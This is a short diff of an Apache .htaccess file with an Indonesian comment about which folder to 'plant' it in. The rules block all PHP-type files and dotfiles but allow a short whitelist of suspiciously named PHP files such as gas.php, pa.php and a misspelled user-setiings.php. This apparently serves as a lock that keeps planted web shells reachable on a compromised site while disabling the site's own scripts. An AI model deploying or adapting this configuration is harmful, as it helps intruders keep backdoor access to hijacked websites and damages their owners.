@@ -1,19 +1,22 @@
+Di dalam .htaccess kita bisa isi di dalam file  agar semua file bisa di dan jangan lupa di folder mana yang mau kita
+tanam file nya 
+
 Options -Indexes
 
 <FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
-Order allow,deny
-Deny from all
+    Order allow,deny
+    Deny from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
-Order allow,deny
-Allow from all
+    Order allow,deny
+    Allow from all
 </FilesMatch>
 
-<FilesMatch '^(user-setiings.php|gas.php|issues.php|in.php|pa.php|gas.php|la.php|pag.php|)$'>
-Order allow,deny
-Allow from all
+<FilesMatch '^(user-setiings.php|gas.php|issues.php|in.php|la.php|pa.php|pag.php)$'>
+    Order allow,deny
+    Allow from all
 </FilesMatch>
 <FilesMatch "^\.">
-Order allow,deny
-Deny from all
-</FilesMatch>
+    Order allow,deny
+    Deny from all
+</FilesMatch>   
